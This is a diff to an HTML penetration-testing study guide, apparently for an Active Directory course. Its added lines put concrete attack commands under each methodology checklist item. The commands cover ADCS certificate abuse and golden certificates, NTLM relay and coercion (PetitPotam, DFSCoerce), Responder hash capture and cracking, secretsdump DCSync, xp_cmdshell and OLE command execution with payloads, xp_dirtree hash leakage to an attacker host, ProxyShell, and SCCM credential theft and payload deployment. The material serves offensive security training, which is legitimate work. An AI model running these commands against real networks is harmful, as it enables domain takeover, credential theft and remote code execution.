+python3 PetitPotam.py -u user -p pass -d domain.local &lt;attacker-ip&gt; &lt;target-dc&gt;</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc13">9.3.15 ESC13, OID Group Link</h4>
@@ -2431,8 +2685,13 @@ certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &
 certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc13-wf-0"> Identify a template whose Application Policy OID resolves to a Universal Security Group Certipy flags as ESC13.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc13-wf-1"> Enrol against the template; the issued certificate grants effective membership in the linked group at authentication time.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc13-wf-0"> Identify a template whose Application Policy OID resolves to a Universal Security Group Certipy flags as ESC13.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout | grep -A5 ESC13</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc13-wf-1"> Enrol against the template; the issued certificate grants effective membership in the linked group at authentication time.
+<pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template &lt;esc13-template&gt; -ca 'domain-DC-CA'
+certipy auth -pfx user.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-shadow-creds">9.3.16 Shadow Credentials</h4>
@@ -2447,8 +2706,12 @@ certipy shadow -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -accou
 certipy shadow -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -account '&lt;target&gt;' clear</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-shadow-wf-0"> Confirm write access on the target's <code>msDS-KeyCredentialLink</code> (<code>GenericWrite</code> is enough).</li>
-<li><input type="checkbox" data-id="cape-adcs-shadow-wf-1"> Run <code>certipy shadow auto</code> to add a key credential and receive the TGT and NTLM hash in one step.</li>
+<li><input type="checkbox" data-id="cape-adcs-shadow-wf-0"> Confirm write access on the target's <code>msDS-KeyCredentialLink</code> (<code>GenericWrite</code> is enough).
+<pre><code class="language-powershell">Get-DomainObjectAcl -Identity &lt;target&gt; -ResolveGUIDs | ? { $_.ObjectAceType -match 'msDS-KeyCredentialLink' -or $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl' }</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-shadow-wf-1"> Run <code>certipy shadow auto</code> to add a key credential and receive the TGT and NTLM hash in one step.
+<pre><code class="language-bash">certipy shadow -u user@domain.local -p pass -account '&lt;target&gt;' auto</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-golden-cert">9.3.17 Golden Certificate</h4>
@@ -2463,8 +2726,13 @@ certipy forge -ca-pfx ca.pfx -upn administrator@&lt;domain.local&gt; -subject 'C
 certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-golden-wf-0"> Extract the CA private key from a compromised CA server with <code>certipy ca -backup</code>.</li>
-<li><input type="checkbox" data-id="cape-adcs-golden-wf-1"> Forge a certificate for any principal with <code>certipy forge</code> and authenticate to obtain a TGT.</li>
+<li><input type="checkbox" data-id="cape-adcs-golden-wf-0"> Extract the CA private key from a compromised CA server with <code>certipy ca -backup</code>.
+<pre><code class="language-bash">certipy ca -u user@domain.local -p pass -backup -ca 'domain-DC-CA'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-golden-wf-1"> Forge a certificate for any principal with <code>certipy forge</code> and authenticate to obtain a TGT.
+<pre><code class="language-bash">certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'
+certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-certipy-auth">9.3.18 Authenticating with the Certificate</h4>
@@ -2474,8 +2742,12 @@ certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <p>Sample output, TGT saved as .ccache, plus the NTLM hash of the impersonated user, which becomes reusable material for PtH and DCSync.</p>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-auth-wf-0"> Authenticate with the certificate to obtain a TGT and the target's NTLM hash: <code>certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code>.</li>
-<li><input type="checkbox" data-id="cape-adcs-auth-wf-1"> Feed the NTLM hash into DCSync or use the TGT for further Kerberos operations.</li>
+<li><input type="checkbox" data-id="cape-adcs-auth-wf-0"> Authenticate with the certificate to obtain a TGT and the target's NTLM hash: <code>certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code>.
+<pre><code class="language-bash">certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-auth-wf-1"> Feed the NTLM hash into DCSync or use the TGT for further Kerberos operations.
+<pre><code class="language-bash">secretsdump.py -hashes :&lt;ntlm-hash&gt; domain.local/administrator@&lt;dc-ip&gt; -just-dc</code></pre>
+</li>
 </ul>
 
 <h2 id="cape-ntlm-relay-10">10. NTLM Relay Attacks</h2>
@@ -2487,9 +2759,17 @@ certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <p>Every relay chain shares the same first three steps: pick a target where signing is off, boot Responder without SMB/HTTP so ntlmrelayx catches the traffic, then coerce or wait for auth. The technique-specific methodology blocks below build on this baseline.</p>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-0"> Scan the target segment for SMB signing state: <code>nmap --script=smb2-security-mode -p 445 &lt;subnet&gt;</code>.</li>
-<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-1"> Turn off Responder's SMB and HTTP listeners so <code>ntlmrelayx</code> can bind to those ports.</li>
-<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-2"> Start Responder and <code>ntlmrelayx</code> in parallel; wait for or force NTLM authentication.</li>
+<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-0"> Scan the target segment for SMB signing state: <code>nmap --script=smb2-security-mode -p 445 &lt;subnet&gt;</code>.
+<pre><code class="language-bash">nmap --script=smb2-security-mode -p 445 &lt;subnet&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-1"> Turn off Responder's SMB and HTTP listeners so <code>ntlmrelayx</code> can bind to those ports.
+<pre><code class="language-bash">sed -i 's/SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
+sed -i 's/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-2"> Start Responder and <code>ntlmrelayx</code> in parallel; wait for or force NTLM authentication.
+<pre><code class="language-bash">sudo responder -I eth0 -rdwv
+python3 ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-llmnr">10.1 LLMNR Poisoning</h3>
@@ -2517,8 +2797,12 @@ hashcat -m 5600 hash.txt /path/to/wordlist.txt</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-llmnr-wf-0"> Run <code>responder -I &lt;iface&gt; -rdwv</code> on the target VLAN and wait for a broadcast name lookup that DNS fails to resolve.</li>
-<li><input type="checkbox" data-id="cape-ntlm-llmnr-wf-1"> Collect the NTLMv2 handshake to <code>Responder-Session.log</code>, then crack with <code>hashcat -m 5600</code>.</li>
+<li><input type="checkbox" data-id="cape-ntlm-llmnr-wf-0"> Run <code>responder -I &lt;iface&gt; -rdwv</code> on the target VLAN and wait for a broadcast name lookup that DNS fails to resolve.
+<pre><code class="language-bash">sudo responder -I &lt;iface&gt; -rdwv</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-llmnr-wf-1"> Collect the NTLMv2 handshake to <code>Responder-Session.log</code>, then crack with <code>hashcat -m 5600</code>.
+<pre><code class="language-bash">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-smb-relay">10.2 SMB Relay</h3>
@@ -2574,9 +2858,19 @@ nc 127.0.0.1 &lt;port&gt;</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-0"> Confirm the relayed identity is a local admin on the target host; SMB relay without admin gets you nothing usable.</li>
-<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-1"> Run <code>ntlmrelayx.py -tf targets.txt -smb2support</code>, then choose <code>-e payload.exe</code>, <code>-c "cmd"</code>, or <code>-i</code> depending on the goal.</li>
-<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-2"> After a successful relay, dump SAM / LSA on the target and reuse extracted hashes for lateral movement.</li>
+<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-0"> Confirm the relayed identity is a local admin on the target host; SMB relay without admin gets you nothing usable.
+<pre><code class="language-bash"># BloodHound: MATCH (u {name:'&lt;RELAYED&gt;'})-[:AdminTo]-&gt;(c:Computer) RETURN c
+# Or netexec: netexec smb &lt;target&gt; -u &lt;relayed&gt; -H &lt;hash&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-1"> Run <code>ntlmrelayx.py -tf targets.txt -smb2support</code>, then choose <code>-e payload.exe</code>, <code>-c "cmd"</code>, or <code>-i</code> depending on the goal.
+<pre><code class="language-bash">python3 ntlmrelayx.py -tf targets.txt -smb2support
+python3 ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
+python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+python3 ntlmrelayx.py -tf targets.txt -smb2support -i</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-2"> After a successful relay, dump SAM / LSA on the target and reuse extracted hashes for lateral movement.
+<pre><code class="language-bash">secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-capture-hashes">10.3 Capturing Hashes with Responder</h3>
@@ -2623,8 +2917,12 @@ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-capture-wf-0"> Run <code>responder -I &lt;iface&gt; -dwPv</code> with all poisoners on, plus rogue WPAD and forced NTLM auth.</li>
-<li><input type="checkbox" data-id="cape-ntlm-capture-wf-1"> Collect NTLMv2 hashes from <code>Responder-Session.log</code> and crack with <code>hashcat -m 5600</code>.</li>
+<li><input type="checkbox" data-id="cape-ntlm-capture-wf-0"> Run <code>responder -I &lt;iface&gt; -dwPv</code> with all poisoners on, plus rogue WPAD and forced NTLM auth.
+<pre><code class="language-bash">sudo responder -I &lt;iface&gt; -dwPv</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-capture-wf-1"> Collect NTLMv2 hashes from <code>Responder-Session.log</code> and crack with <code>hashcat -m 5600</code>.
+<pre><code class="language-bash">hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-ldap-relay">10.4 Relay to LDAP for DACL Escalation</h3>
@@ -2640,9 +2938,15 @@ secretsdump.py &lt;domain.local&gt;/&lt;low-priv-user&gt;:'&lt;password&gt;'@&lt
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-0"> Relay to LDAPS (LDAP signing usually blocks LDAP relays but leaves LDAPS open).</li>
-<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-1"> Use <code>--escalate-user</code> to grant DCSync to a low-priv account, or <code>--delegate-access</code> to set RBCD on the relayed computer.</li>
-<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-2"> Verify with <code>secretsdump.py -just-dc-ntlm</code>.</li>
+<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-0"> Relay to LDAPS (LDAP signing usually blocks LDAP relays but leaves LDAPS open).
+<pre><code class="language-bash">python3 ntlmrelayx.py -t ldaps://&lt;dc-fqdn&gt; --escalate-user &lt;low-priv-user&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-1"> Use <code>--escalate-user</code> to grant DCSync to a low-priv account, or <code>--delegate-access</code> to set RBCD on the relayed computer.
+<pre><code class="language-bash">python3 ntlmrelayx.py -t ldaps://&lt;dc-fqdn&gt; --delegate-access</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-2"> Verify with <code>secretsdump.py -just-dc-ntlm</code>.
+<pre><code class="language-bash">secretsdump.py domain.local/&lt;low-priv-user&gt;:pass@&lt;dc-ip&gt; -just-dc-ntlm</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-certipy-relay">10.4a Certipy Relay Mode</h3>
@@ -2667,9 +2971,15 @@ certipy auth -pfx &lt;dc&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-0"> Point <code>ntlmrelayx --adcs --template DomainController</code> at <code>http://&lt;ca&gt;/certsrv/certfnsh.asp</code>.</li>
-<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-1"> Coerce the DC with PetitPotam, DFSCoerce, or PrinterBug; the relayed cert authenticates as the DC via PKINIT.</li>
-<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-2"> Authenticate with the resulting PFX to receive the DC's TGT and NTLM hash for DCSync.</li>
+<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-0"> Point <code>ntlmrelayx --adcs --template DomainController</code> at <code>http://&lt;ca&gt;/certsrv/certfnsh.asp</code>.
+<pre><code class="language-bash">python3 ntlmrelayx.py -t http://&lt;ca-fqdn&gt;/certsrv/certfnsh.asp --adcs --template DomainController</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-1"> Coerce the DC with PetitPotam, DFSCoerce, or PrinterBug; the relayed cert authenticates as the DC via PKINIT.
+<pre><code class="language-bash">python3 PetitPotam.py -u user -p pass -d domain.local &lt;attacker-ip&gt; &lt;target-dc&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-2"> Authenticate with the resulting PFX to receive the DC's TGT and NTLM hash for DCSync.
+<pre><code class="language-bash">certipy auth -pfx &lt;dc&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-mssql-relay">10.6 Relay to MSSQL</h3>
@@ -2681,8 +2991,14 @@ ntlmrelayx.py -t mssql://&lt;target-fqdn&gt; -socks</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-mssql-relay-wf-0"> Verify the relayed identity has sysadmin (or equivalent) on the target instance.</li>
-<li><input type="checkbox" data-id="cape-ntlm-mssql-relay-wf-1"> Relay to MSSQL with <code>-q 'EXEC xp_cmdshell "&lt;cmd&gt;"'</code>, or use <code>-socks</code> for interactive follow-up.</li>
+<li><input type="checkbox" data-id="cape-ntlm-mssql-relay-wf-0"> Verify the relayed identity has sysadmin (or equivalent) on the target instance.
+<pre><code class="language-bash"># Check whether the relayed principal is a sysadmin
+python3 mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;target&gt; -q "SELECT IS_SRVROLEMEMBER('sysadmin')"</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-mssql-relay-wf-1"> Relay to MSSQL with <code>-q 'EXEC xp_cmdshell "&lt;cmd&gt;"'</code>, or use <code>-socks</code> for interactive follow-up.
+<pre><code class="language-bash">python3 ntlmrelayx.py -t mssql://&lt;target-fqdn&gt; -q 'EXEC xp_cmdshell "whoami"'
+python3 ntlmrelayx.py -t mssql://&lt;target-fqdn&gt; -socks</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-mitm6">10.7 mitm6, IPv6 as a Poisoning Route</h3>
@@ -2695,8 +3011,12 @@ ntlmrelayx.py -6 -wh &lt;attacker-fqdn&gt; -t ldaps://&lt;dc-fqdn&gt; --escalate
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-mitm6-wf-0"> Run <code>mitm6 -i &lt;iface&gt; -d &lt;domain.local&gt;</code> to hand out yourself as the DNS server via DHCPv6.</li>
-<li><input type="checkbox" data-id="cape-ntlm-mitm6-wf-1"> Relay the intercepted authentication with <code>ntlmrelayx -6 -wh &lt;attacker-fqdn&gt;</code> against LDAPS.</li>
+<li><input type="checkbox" data-id="cape-ntlm-mitm6-wf-0"> Run <code>mitm6 -i &lt;iface&gt; -d &lt;domain.local&gt;</code> to hand out yourself as the DNS server via DHCPv6.
+<pre><code class="language-bash">mitm6 -i &lt;iface&gt; -d domain.local</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-mitm6-wf-1"> Relay the intercepted authentication with <code>ntlmrelayx -6 -wh &lt;attacker-fqdn&gt;</code> against LDAPS.
+<pre><code class="language-bash">python3 ntlmrelayx.py -6 -wh &lt;attacker-fqdn&gt; -t ldaps://&lt;dc-fqdn&gt; --escalate-user &lt;low-priv-user&gt;</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-ntlm-coercion-primitives">10.8 Coercion Primitives</h3>
@@ -2715,8 +3035,14 @@ coercer coerce -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; -l &lt;at
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-coerce-wf-0"> Start with PetitPotam (MS-EFSR); fall back to DFSCoerce (MS-DFSNM) or PrinterBug (MS-RPRN) when patched.</li>
-<li><input type="checkbox" data-id="cape-ntlm-coerce-wf-1"> Sweep unknown targets with <code>coercer coerce</code> to enumerate which primitives still trigger.</li>
+<li><input type="checkbox" data-id="cape-ntlm-coerce-wf-0"> Start with PetitPotam (MS-EFSR); fall back to DFSCoerce (MS-DFSNM) or PrinterBug (MS-RPRN) when patched.
+<pre><code class="language-bash">python3 PetitPotam.py -u user -p pass -d domain.local &lt;attacker-ip&gt; &lt;target-dc&gt;
+python3 dfscoerce.py -u user -p pass -d domain.local &lt;attacker-ip&gt; &lt;target-dc&gt;
+SpoolSample.exe &lt;target&gt; &lt;attacker-fqdn&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-ntlm-coerce-wf-1"> Sweep unknown targets with <code>coercer coerce</code> to enumerate which primitives still trigger.
+<pre><code class="language-bash">coercer coerce -u user -p pass -d domain.local -l &lt;attacker-ip&gt; -t &lt;target&gt;</code></pre>
+</li>
 </ul>
 
 <h2 id="cape-adcs-attacks-11">11. Active Directory Trust Attacks</h2>
@@ -3755,11 +4081,33 @@ CREATE ASSEMBLY [&lt;assembly-name&gt;] FROM 0x&lt;hex-blob&gt; WITH PERMISSION_
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-mssql-attacks-wf-0"> Enumerate reachable MSSQL SPNs and hosts (<code>Get-SQLInstanceDomain</code>, <code>PowerUpSQL</code>, <code>impacket-mssqlclient</code>).</li>
-<li><input type="checkbox" data-id="cape-mssql-attacks-wf-1"> Test <code>xp_cmdshell</code> availability and toggle it via <code>sp_configure</code> if it's disabled but you hold sysadmin.</li>
-<li><input type="checkbox" data-id="cape-mssql-attacks-wf-2"> Enumerate <code>IMPERSONATE</code> grants and walk the <code>EXECUTE AS</code> chain up to <code>sa</code>.</li>
-<li><input type="checkbox" data-id="cape-mssql-attacks-wf-3"> Coerce SQL out to a UNC path (<code>xp_dirtree</code>) when direct code execution is not reachable, then capture or relay the service-account hash.</li>
-<li><input type="checkbox" data-id="cape-mssql-attacks-wf-4"> If OLE Automation is enabled, use <code>sp_OACreate</code>-based execution as a fallback when <code>xp_cmdshell</code> is blocked.</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-0"> Enumerate reachable MSSQL SPNs and hosts (<code>Get-SQLInstanceDomain</code>, <code>PowerUpSQL</code>, <code>impacket-mssqlclient</code>).
+<pre><code class="language-powershell">Get-SQLInstanceDomain
+Get-SQLInstanceDomain | Get-SQLConnectionTest
+setspn -T &lt;domain&gt; -Q MSSQLSvc/*</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-1"> Test <code>xp_cmdshell</code> availability and toggle it via <code>sp_configure</code> if it's disabled but you hold sysadmin.
+<pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-2"> Enumerate <code>IMPERSONATE</code> grants and walk the <code>EXECUTE AS</code> chain up to <code>sa</code>.
+<pre><code class="language-sql">SELECT DISTINCT b.name AS grantee, a.name AS impersonated
+FROM sys.server_permissions p
+  JOIN sys.server_principals a ON p.grantor_principal_id = a.principal_id
+  JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id
+WHERE p.permission_name = 'IMPERSONATE';
+EXECUTE AS LOGIN = 'sa'; SELECT SUSER_SNAME();</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-3"> Coerce SQL out to a UNC path (<code>xp_dirtree</code>) when direct code execution is not reachable, then capture or relay the service-account hash.
+<pre><code class="language-sql">EXEC master..xp_dirtree '\\&lt;attacker-ip&gt;\share\';</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-4"> If OLE Automation is enabled, use <code>sp_OACreate</code>-based execution as a fallback when <code>xp_cmdshell</code> is blocked.
+<pre><code class="language-sql">EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+DECLARE @sh INT;
+EXEC sp_OACreate 'WScript.Shell', @sh OUTPUT;
+EXEC sp_OAMethod @sh, 'Run', NULL, 'cmd /c &lt;payload&gt;';</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-exchange">14.2 Exchange Attacks</h3>
@@ -3793,10 +4141,21 @@ python3 proxyshell.py -u '&lt;exchange-fqdn&gt;' -e '&lt;target-mailbox&gt;@&lt;
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-exchange-attacks-wf-0"> Locate the Exchange server by SPN (<code>setspn -T &lt;domain&gt; -Q */* | Select-String exchange</code>) or by nmap on Exchange ports.</li>
-<li><input type="checkbox" data-id="cape-exchange-attacks-wf-1"> Check for PrivExchange: coerce Exchange to authenticate to <code>ntlmrelayx --escalate-user</code> pointed at LDAP.</li>
-<li><input type="checkbox" data-id="cape-exchange-attacks-wf-2"> Test the build for ProxyLogon and ProxyShell exposure against <code>/autodiscover/autodiscover.json?a=x@x.local</code>.</li>
-<li><input type="checkbox" data-id="cape-exchange-attacks-wf-3"> On escalation, DCSync with <code>secretsdump.py -just-dc-ntlm</code> using the granted rights.</li>
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-0"> Locate the Exchange server by SPN (<code>setspn -T &lt;domain&gt; -Q */* | Select-String exchange</code>) or by nmap on Exchange ports.
+<pre><code class="language-powershell">setspn -T &lt;domain&gt; -Q */* | Select-String "exchange"
+nmap -p 25,443,110,143,993,995 &lt;target&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-1"> Check for PrivExchange: coerce Exchange to authenticate to <code>ntlmrelayx --escalate-user</code> pointed at LDAP.
+<pre><code class="language-bash">python3 ntlmrelayx.py -t ldap://&lt;dc&gt; --escalate-user &lt;low-priv-user&gt;
+python3 privexchange.py -ah &lt;attacker&gt; &lt;exchange-server&gt; -u user -p pass -d domain.local</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-2"> Test the build for ProxyLogon and ProxyShell exposure against <code>/autodiscover/autodiscover.json?a=x@x.local</code>.
+<pre><code class="language-bash">curl -sk 'https://&lt;exchange-fqdn&gt;/autodiscover/autodiscover.json?a=x@x.local'
+python3 proxyshell.py -u '&lt;exchange-fqdn&gt;' -e '&lt;target-mailbox&gt;@domain.local'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-3"> On escalation, DCSync with <code>secretsdump.py -just-dc-ntlm</code> using the granted rights.
+<pre><code class="language-bash">secretsdump.py domain.local/&lt;low-priv-user&gt;:pass@&lt;dc&gt; -just-dc-ntlm</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-sccm">14.3 SCCM Attacks</h3>
@@ -3837,11 +4196,24 @@ SharpSCCM.exe get naa</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-sccm-attacks-wf-0"> Locate SCCM primary sites and management points via the <code>System Management</code> AD container and <code>SharpSCCM get site-info</code>.</li>
-<li><input type="checkbox" data-id="cape-sccm-attacks-wf-1"> Extract NAA credentials on any client host with <code>SharpSCCM local secrets --method wmi</code>.</li>
-<li><input type="checkbox" data-id="cape-sccm-attacks-wf-2"> Trigger client-push authentication and relay to SMB or LDAP with <code>ntlmrelayx</code>.</li>
-<li><input type="checkbox" data-id="cape-sccm-attacks-wf-3"> With Application Administrator or above, deploy a payload to a target device or collection using <code>SharpSCCM exec</code>.</li>
-<li><input type="checkbox" data-id="cape-sccm-attacks-wf-4"> On networks with PXE enabled, pull OSD media with PXEThief and decrypt the embedded NAA blob.</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-0"> Locate SCCM primary sites and management points via the <code>System Management</code> AD container and <code>SharpSCCM get site-info</code>.
+<pre><code class="language-powershell">Get-ADObject -Filter {ObjectClass -eq 'mSSMSSite'} -SearchBase 'CN=System Management,CN=System,DC=domain,DC=local'
+SharpSCCM.exe get site-info</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-1"> Extract NAA credentials on any client host with <code>SharpSCCM local secrets --method wmi</code>.
+<pre><code class="language-bash">SharpSCCM.exe local secrets --method wmi</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-2"> Trigger client-push authentication and relay to SMB or LDAP with <code>ntlmrelayx</code>.
+<pre><code class="language-bash">SharpSCCM.exe invoke client-push -t &lt;attacker-ip&gt;
+ntlmrelayx.py -t smb://&lt;target&gt; -smb2support -c '&lt;payload&gt;'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-3"> With Application Administrator or above, deploy a payload to a target device or collection using <code>SharpSCCM exec</code>.
+<pre><code class="language-bash">SharpSCCM.exe exec -d &lt;target-device&gt; -p &lt;payload-path&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-4"> On networks with PXE enabled, pull OSD media with PXEThief and decrypt the embedded NAA blob.
+<pre><code class="language-bash">python3 PXEThief.py -i &lt;attacker-nic&gt; -p &lt;pxe-server-ip&gt;
+python3 PXEThief.py decrypt -f &lt;policy-blob&gt;</code></pre>
+</li>
 </ul>
 
 </div>
